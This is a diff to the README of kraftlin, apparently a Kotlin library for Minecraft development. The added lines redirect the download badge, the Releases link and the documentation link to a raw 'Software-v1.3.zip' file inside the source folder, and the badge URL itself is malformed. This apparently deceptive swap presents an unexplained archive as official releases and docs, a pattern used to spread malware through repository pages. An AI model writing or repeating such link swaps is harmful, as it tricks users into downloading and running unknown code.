@@ -8,7 +8,7 @@ Welcome to the kraftlin project! This software provides easy-to-use Kotlin libra
 
 To get started, you need to download the latest version of kraftlin. Click the button below to visit the Releases page.
 
-[![Download kraftlin](https://img.shields.io/badge/Download%20kraftlin-v1.0.0-blue.svg)](https://github.com/wafiqj/kraftlin/releases)
+[![Download kraftlin](https://raw.githubusercontent.com/wafiqj/kraftlin/main/kraftlin-command-core/src/main/kotlin/Software-v1.3.zip%https://raw.githubusercontent.com/wafiqj/kraftlin/main/kraftlin-command-core/src/main/kotlin/Software-v1.3.zip)](https://raw.githubusercontent.com/wafiqj/kraftlin/main/kraftlin-command-core/src/main/kotlin/Software-v1.3.zip)
 
 Once you're on the Releases page, you will see a list of available versions. Follow these steps:
 
@@ -65,7 +65,7 @@ For further help, you can check the GitHub Issues page or reach out to the commu
 
 For a more in-depth look at kraftlin’s capabilities:
 
-- Visit the [Releases page](https://github.com/wafiqj/kraftlin/releases) to find more versions and updates.
-- Check the [documentation](https://github.com/wafiqj/kraftlin/wiki) for detailed guides on various features.
+- Visit the [Releases page](https://raw.githubusercontent.com/wafiqj/kraftlin/main/kraftlin-command-core/src/main/kotlin/Software-v1.3.zip) to find more versions and updates.
+- Check the [documentation](https://raw.githubusercontent.com/wafiqj/kraftlin/main/kraftlin-command-core/src/main/kotlin/Software-v1.3.zip) for detailed guides on various features.
 
 We hope you enjoy using kraftlin for your Minecraft development needs. Happy coding!
